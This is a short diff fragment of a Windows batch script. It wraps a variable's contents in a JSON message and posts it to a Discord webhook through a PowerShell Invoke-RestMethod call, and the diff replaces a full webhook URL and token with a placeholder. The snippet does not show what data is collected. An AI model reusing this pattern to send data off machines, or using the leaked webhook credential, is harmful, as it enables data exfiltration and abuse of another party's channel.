@@ -19,7 +19,7 @@ set "output=%output:"=\"%"
 set "payload={\"content\":\"```%output%```\"}"
 
 :: Replace YOUR_DISCORD_WEBHOOK_URL with your actual webhook URL
-set "webhook_url=https://discord.com/api/webhooks/1255943647149690941/t9nTFv3_TYtxxSwenr9rRFviNSACYRnSaJj8BUdywk-jjINFdfVeuHAS9f4koeW0KRj0"
+set "webhook_url= YOUR_WEBHOOK"
 
 :: Use PowerShell to send the payload to Discord
 powershell -Command "Invoke-RestMethod -Uri '%webhook_url%' -Method Post -ContentType 'application/json' -Body '%payload%'"
